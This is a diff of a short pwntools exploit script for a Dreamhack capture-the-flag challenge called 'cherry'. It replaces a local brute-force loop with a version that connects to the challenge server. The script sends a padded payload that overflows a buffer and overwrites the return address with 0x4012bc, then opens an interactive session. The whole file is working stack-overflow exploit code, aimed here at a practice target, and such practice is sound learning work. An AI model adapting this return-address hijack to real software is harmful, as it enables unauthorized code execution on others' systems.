@@ -1,25 +1,18 @@
-from pwn import *
+from pwn import process, remote, context, p32, p64, gdb
 
-for i in range(201, 1001):
-    print(f"Try {i}")
-    #p = remote("host3.dreamhack.games", 10626)
-    p = process('steam-run ./a/chall', shell=True)
+REMOTE = True
+context.log_level = 'debug'
 
-    p.recvuntil("Menu: ".encode())
+if REMOTE:
+ p = remote('host3.dreamhack.games',11844)
+else:
+ p = process('steam-run ./chall', shell=True)
 
-    p.sendline('cherry'.encode())
+payload = b'cherryaidiowoqeoqwjoejpwqweiowqejoqejowoie'
+p.recvuntil(b":")
+assert len(payload[:0x10]) == 0x10
+p.send(payload[:0x10])
+p.recvuntil(b":")
+p.send(payload[0x10:] + p64(0x00000000004012bc))
+p.interactive()
 
-    p.recvuntil("Is it cherry?: ".encode())
-
-    # return address: 0x00000000004012bc
-    # 24 바이트 오버플로우
-
-    payload = b"A" * i + p64(0x4012bc)
-
-    p.sendline(payload)
-
-    p.interactive()
-
-    p.close()
-
-    print('\n\n\n\n')
